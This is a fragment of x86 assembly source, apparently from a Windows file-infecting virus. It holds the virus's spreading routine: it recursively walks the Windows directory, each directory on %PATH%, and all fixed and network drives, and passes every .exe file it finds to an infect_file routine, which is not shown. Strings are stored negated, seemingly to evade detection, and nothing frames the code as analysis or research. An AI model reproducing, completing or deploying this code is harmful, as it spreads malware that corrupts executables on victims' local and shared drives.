
RECSERCH_MAXFILENAME    equ     1024

recsearch:              pusha
                        sub     esp, size ff_struc
                        mov     edi, esp
                        cld

                        call    process_windir
                        call    process_path
                        call    process_drives

                        add     esp, size ff_struc
                        popa
                        clc
                        retn

; ===========================================================================

; subroutine: process_windir
; action:     process md directory & all subdirs
;             1. get %windir%
;             2. call process_directory
; input:      EDI=ff_struc
; output:     none

process_windir:         pusha
                        mov     esi, RECSERCH_MAXFILENAME
                        sub     esp, esi
                        mov     edx, esp
                        push    esi
                        push    edx
                        callX   GetWindowsDirectoryA
                        mov     edx, esp
                        call    process_directory
                        add     esp, esi
                        popa
                        retn

; subroutine: process_path
; action:     process all dirs/subdirs from %path%
;             1. get %path%
;             2. parse %path% and call process_directory for each dirname
; input:      EDI=ff_struc
; output:     none

process_path:           pusha
                        sub     esp, RECSERCH_MAXFILENAME
                        mov     esi, esp
                        mov     dword ptr [esi], -'HTAP'
                        neg     dword ptr [esi]
                        mov     byte ptr [esi+4], 0
                        mov     ebx, RECSERCH_MAXFILENAME-1
                        push    ebx
                        push    esi
                        push    esi
                        callX   GetEnvironmentVariableA
                        mov     byte ptr [esi+ebx], 0
__cycle:                mov     edx, esi
__scan:                 lodsb
                        or      al, al
                        jz      __done
                        cmp     al, ';'
                        jne     __scan
__done:                 sub     [esi-1], al
                        call    process_directory
                        or      al, al
                        jnz     __cycle
                        add     esp, RECSERCH_MAXFILENAME
                        popa
                        retn

; subroutine: process_drives
; action:     for each drive (A:..Z:) with type DRIVE_FIXED||DRIVE_REMOTE
;             call subroutine process_directory passing drive's root as arg
; input:      EDI=ff_struc
; output:     none

process_drives:         pusha
                        mov     eax, -'\:A'
                        neg     eax
                        push    eax
__cycle:                push    esp
                        callX   GetDriveTypeA
                        cmp     eax, DRIVE_FIXED
                        je      __do
                        cmp     eax, DRIVE_REMOTE
                        jne     __next
__do:                   mov     edx, esp
                        call    process_directory
__next:                 inc     byte ptr [esp]
                        cmp     byte ptr [esp], 'Z'
                        jbe     __cycle
                        pop     eax
                        popa
                        retn

; subroutine: process_directory
; action:     1. set current directory to one specified by EDX
;             2. find all files in the current directory
;             3. for each found directory (except "."/"..") recursive call;
;                for each found file call process_file
;             4. set current directory to ".."
; input:      EDI=ff_struc
;             EDX=directory name (should be full path if 1st call)
; output:     none

process_directory:      pusha
                        sub     esp, RECSERCH_MAXFILENAME

                        mov     ebx, edi
                        mov     esi, edx
                        mov     edi, esp
__1:                    lodsb
                        stosb
                        or      al, al
                        jnz     __1
                        dec     edi
                        mov     al, '\'
                        cmp     [edi-1], al
                        je      __3
                        stosb
__3:                    mov     ecx, edi
                        mov     eax, -'*.*'
                        neg     eax
                        stosd
                        mov     edi, ebx

                        mov     eax, esp
                        push    ecx
                        push    edi
                        push    eax
                        callX   FindFirstFileA
                        pop     ecx

                        mov     esi, eax
                        inc     eax
                        jz      __quit

__cycle:

                        pusha
                        lea     esi, [edi].ff_fullname
                        mov     edi, ecx
__2:                    lodsb
                        stosb
                        or      al, al
                        jnz     __2
                        popa

                        mov     edx, esp

                        test    byte ptr [edi].ff_attr, 16
                        jnz     __dir

                        call    process_file

                        jmp     __next

__dir:                  lea     eax, [edi].ff_fullname
                        cmp     byte ptr [eax], '.'
                        je      __next

                        call    process_directory

__next:                 push    ecx
                        push    edi
                        push    esi
                        callX   FindNextFileA
                        pop     ecx

                        or      eax, eax
                        jnz     __cycle

                        push    esi
                        callX   FindClose

__quit:                 add     esp, RECSERCH_MAXFILENAME
                        popa
                        retn

;----------------------------------------------------------------------------

; subroutine: process_file
; action:     handle each file found by process_directory
; input:      EDI=ff_struc
;             EDX=file name ([edi].ff_fullname)
; output:     none

process_file:           pusha

                        mov     ecx, edx
__scan0:                mov     eax, [ecx]
                        inc     ecx
                        or      al, al
                        jnz     __scan0
                        mov     eax, [ecx-5]
                        or      eax, 20202000h
                        neg     eax

                        cmp     eax, -'exe.'    ; build: change to -'exe.'
                        jne     __exit

                        call    infect_file

__exit:                 popa
                        retn
